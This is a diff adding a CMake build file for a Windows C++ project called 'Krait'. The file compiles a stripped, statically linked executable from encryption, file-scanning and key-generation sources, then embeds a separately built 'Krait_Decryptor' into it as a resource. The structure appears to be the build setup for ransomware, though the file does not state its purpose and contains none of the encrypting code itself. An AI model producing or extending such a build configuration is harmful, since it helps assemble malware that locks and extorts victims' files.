@@ -1,0 +1,53 @@
+cmake_minimum_required(VERSION 3.10)
+project(Krait)
+
+set(CMAKE_CXX_STANDARD 17)
+set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -O2 -s -static")
+
+# Main executable
+add_executable(Krait
+    src/main.cpp
+    src/encryption.cpp
+    src/file_scanner.cpp
+    src/keygen.cpp
+    src/utils.cpp
+    resources/resource.rc
+)
+
+target_link_libraries(Krait
+    -ladvapi32
+    -luser32
+    -lgdi32
+    -lshell32
+    -liphlpapi
+    -lwbemuuid
+    -lcrypt32
+    -lws2_32
+)
+
+# Decryptor (separate)
+add_executable(Krait_Decryptor
+    decryptor/main.cpp
+    src/encryption.cpp
+    src/keygen.cpp
+    src/utils.cpp
+)
+
+target_link_libraries(Krait_Decryptor
+    -ladvapi32
+    -luser32
+    -lgdi32
+    -lshell32
+    -liphlpapi
+    -lwbemuuid
+    -lcrypt32
+    -lws2_32
+)
+
+# Post-build: embed decryptor as resource in main
+add_custom_command(TARGET Krait POST_BUILD
+    COMMAND ${CMAKE_COMMAND} -E copy $<TARGET_FILE:Krait_Decryptor> ${CMAKE_SOURCE_DIR}/resources/KRAIT_DECRYPTOR.exe
+    COMMAND windres -i resources/resource.rc -o resources/resource.res
+    COMMAND ${CMAKE_CXX_COMPILER} -o Krait.exe src/*.cpp resources/resource.res ${CMAKE_CXX_FLAGS}
+    DEPENDS Krait_Decryptor
+)
